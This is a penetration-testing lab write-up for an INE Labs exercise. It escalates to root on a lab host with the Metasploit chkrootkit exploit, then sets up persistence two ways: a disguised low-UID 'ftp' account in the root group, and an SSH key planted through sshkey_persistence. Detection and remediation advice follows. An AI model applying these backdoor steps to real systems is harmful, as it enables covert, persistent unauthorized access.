---
title: "Establishing Persistence on Linux"
description: "After escalating to root via the chkrootkit exploit, establishing persistence two ways: planting a hidden UID-manipulated service account in the root group, and using the sshkey_persistence module to drop an SSH key for key-based re-entry."
date: 2025-11-18
platform: "INE Labs"
difficulty: "Medium"
tags: ["Linux", "Persistence", "chkrootkit", "sshkey_persistence", "Backdoor Account", "Metasploit", "SSH"]
cover: "./photo13.png"
---

# Establishing Persistence on Linux

**Classification:** Host & Network Penetration Testing / The Metasploit Framework<br>
**Target:** demo.ine.local (192.229.4.3) — Ubuntu, OpenSSH 7.6p1<br>
**Credentials:** `jackie:password`

## 1. Executive Summary

Starting from an SSH login as `jackie`, we escalate to root via the **chkrootkit** exploit
(CVE-2014-0476), then establish two persistence mechanisms: a **hidden service account**
(`ftp`, UID manipulated, added to the root group) and an **SSH key backdoor** via the
`sshkey_persistence` post module, allowing key-based re-entry at will.

## 2. Access & Privilege Escalation

```bash
ping -c 4 demo.ine.local
db_nmap -sV 192.229.4.3
services
```

![Ping target](./photo1.png)

![MSF global variables](./photo2.png)

![services — OpenSSH 7.6p1](./photo3.png)

Logging in via `ssh_login` (jackie:password) and upgrading to Meterpreter.

![ssh_login + upgrade](./photo4.png)

Escalating to root with the chkrootkit exploit.

```bash
use exploit/unix/local/chkrootkit
set SESSION 2
run
```

![chkrootkit — root](./photo5.png)

![Flag retrieved](./photo6.png)

## 3. Persistence A — Hidden Service Account

```bash
shell
cat /etc/passwd
```

![/etc/passwd (1)](./photo7.png)

![/etc/passwd (2)](./photo8.png)

Creating an `ftp` account that blends in as a service account.

```bash
useradd ftp
passwd ftp
```

![Creating the ftp user (1)](./photo9.png)

![ftp user in /etc/passwd (2)](./photo10.png)

Adding it to the **root** group and manipulating its UID to 15 (low, service-like) so it is
privileged yet inconspicuous.

```bash
usermod -aG root ftp
# edit /etc/passwd: set ftp UID to 15
```

![Adding ftp to the root group](./photo11.png)

![Setting UID 15 on the ftp user](./photo12.png)

## 4. Persistence B — SSH Key Backdoor

```bash
background
use post/linux/manage/sshkey_persistence
set SESSION 2
set CREATESSHFOLDER true
exploit
```

The module plants our public key in `authorized_keys` (creating `.ssh` folders as needed)
and outputs a private key.

![sshkey_persistence — planting keys](./photo13.png)

![Keys written (1)](./photo14.png)

![Keys written (2)](./photo15.png)

![Generated private key](./photo16.png)

Saving the private key, we can now reconnect over SSH any time — even after terminating all
current sessions.

```bash
chmod 600 id_rsa
ssh -i id_rsa root@192.229.4.3
```

![Saving the private key](./photo17.png)

![Reconnecting with the key (1)](./photo18.png)

![Persistent access confirmed (2)](./photo19.png)

## 5. Detection & Remediation Recommendations

1. **Upgrade chkrootkit** (CVE-2014-0476) to close the initial escalation.
2. **Audit accounts** — alert on new users, UID/GID anomalies, and membership in the root
   group; a low-UID "service" account is a red flag.
3. **Monitor `authorized_keys`** across all home/`.ssh` folders (file integrity monitoring)
   and unexpected `.ssh` directories under system paths like `/bin`, `/dev`.
4. **Apply least privilege** and centralise auth/logging so persistence attempts are visible.
